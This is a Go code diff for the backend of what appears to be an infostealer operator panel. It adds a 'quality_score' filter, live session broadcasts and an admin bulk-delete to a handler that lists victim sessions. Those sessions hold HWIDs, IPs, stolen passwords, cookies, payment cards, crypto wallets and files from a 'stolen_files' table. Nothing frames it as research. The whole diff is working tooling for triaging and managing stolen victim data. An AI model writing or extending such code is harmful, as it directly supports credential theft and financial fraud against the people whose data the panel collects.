@@ -10,6 +10,8 @@ import (
 
 	"github.com/go-chi/chi/v5"
 	"zialfi-panel/internal/db"
+	"zialfi-panel/internal/services"
+	"zialfi-panel/internal/ws"
 	"zialfi-panel/internal/middleware"
 )
 
@@ -32,12 +34,21 @@ var walletIcons = map[string]string{
 }
 
 type SessionsHandler struct {
-	db *sql.DB
-	provider db.ProviderType
+	db          *sql.DB
+	provider    db.ProviderType
+	broadcaster services.Broadcaster
 }
 
-func NewSessionsHandler(db *sql.DB, provider db.ProviderType) *SessionsHandler {
-	return &SessionsHandler{db: db, provider: provider}
+func NewSessionsHandler(db *sql.DB, broadcaster services.Broadcaster, provider db.ProviderType) *SessionsHandler {
+	return &SessionsHandler{db: db, provider: provider, broadcaster: broadcaster}
+}
+
+// broadcastSessionUpdate notifies live viewers that a session changed.
+// nil-safe: unit tests without a hub skip the broadcast.
+func (h *SessionsHandler) broadcastSessionUpdate(sessionID string) {
+	if h.broadcaster != nil {
+		h.broadcaster.Broadcast("sessions:all", ws.NewSessionUpdateEvent(sessionID))
+	}
 }
 
 type SessionListItem struct {
@@ -54,6 +65,7 @@ type SessionListItem struct {
 	CardsCount     int    `json:"cards_count"`
 	WalletsCount   int    `json:"wallets_count"`
 	FilesCount     int    `json:"files_count"`
+	QualityScore   int    `json:"quality_score"`
 	Viewed         int    `json:"viewed"`
 	DuplicateCount int    `json:"duplicate_count,omitempty"`
 }
@@ -117,6 +129,12 @@ func (h *SessionsHandler) List(w http.ResponseWriter, r *http.Request) {
 	if unviewedOnly {
 		conditions = append(conditions, "(s.viewed IS NULL OR s.viewed = 0)")
 	}
+	if minQ := r.URL.Query().Get("min_quality"); minQ != "" {
+		if v, err := strconv.Atoi(minQ); err == nil && v > 0 {
+			conditions = append(conditions, "s.quality_score >= ?")
+			args = append(args, v)
+		}
+	}
 	if typ := r.URL.Query().Get("type"); typ != "" {
 		switch typ {
 		case "password":
@@ -176,7 +194,8 @@ func (h *SessionsHandler) List(w http.ResponseWriter, r *http.Request) {
 		       (SELECT COUNT(*) FROM cookies c WHERE c.session_id = s.id),
 		       (SELECT COUNT(*) FROM cards c WHERE c.session_id = s.id),
 		       (SELECT COUNT(*) FROM wallets w WHERE w.session_id = s.id),
-		       (SELECT COUNT(*) FROM stolen_files f WHERE f.session_id = s.id)
+		       (SELECT COUNT(*) FROM stolen_files f WHERE f.session_id = s.id),
+		       COALESCE(s.quality_score, 0)
 		FROM sessions s %s %s LIMIT ? OFFSET ?`, where, orderClause)
 
 	queryArgs := make([]any, len(args)+2)
@@ -198,7 +217,7 @@ func (h *SessionsHandler) List(w http.ResponseWriter, r *http.Request) {
 			&item.ID, &item.BuildID, &item.Hwid, &item.Os, &item.Username,
 			&item.Ip, &item.CountryCode, &item.CreatedAt, &item.Viewed,
 			&item.PasswordsCount, &item.CookiesCount, &item.CardsCount,
-			&item.WalletsCount, &item.FilesCount,
+			&item.WalletsCount, &item.FilesCount, &item.QualityScore,
 		); err != nil {
 			writeError(w, http.StatusInternalServerError, "failed to scan session row")
 			return
@@ -340,6 +359,7 @@ func (h *SessionsHandler) Delete(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	h.broadcastSessionUpdate(id)
 	writeJSON(w, http.StatusOK, map[string]string{"message": "session deleted"})
 }
 
@@ -362,6 +382,7 @@ func (h *SessionsHandler) MarkViewed(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	h.broadcastSessionUpdate(id)
 	writeJSON(w, http.StatusOK, map[string]bool{"viewed": true})
 }
 
@@ -535,6 +556,7 @@ func (h *SessionsHandler) Lock(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	h.broadcastSessionUpdate(sessionID)
 	writeJSON(w, http.StatusOK, LockInfo{
 		SessionID: sessionID,
 		LockedBy:  claims.UserID,
@@ -580,6 +602,7 @@ func (h *SessionsHandler) Unlock(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	h.broadcastSessionUpdate(sessionID)
 	writeJSON(w, http.StatusOK, map[string]string{
 		"message": "session unlocked",
 	})
@@ -587,4 +610,21 @@ func (h *SessionsHandler) Unlock(w http.ResponseWriter, r *http.Request) {
 
 func (h *SessionsHandler) ownsSession(r *http.Request, sessionID string) bool {
 	return sessionOwnedBy(h.db, h.provider, r, sessionID)
+}
+
+func (h *SessionsHandler) DeleteEmpty(w http.ResponseWriter, r *http.Request) {
+	claims := middleware.ClaimsFromContext(r.Context())
+	if claims == nil || claims.Role != "admin" {
+		writeError(w, http.StatusForbidden, "admin only")
+		return
+	}
+
+	result, err := db.Exec(h.db, h.provider, "DELETE FROM sessions WHERE quality_score = 0")
+	if err != nil {
+		writeError(w, http.StatusInternalServerError, "failed to delete empty sessions")
+		return
+	}
+
+	deleted, _ := result.RowsAffected()
+	writeJSON(w, http.StatusOK, map[string]any{"deleted": deleted})
 }
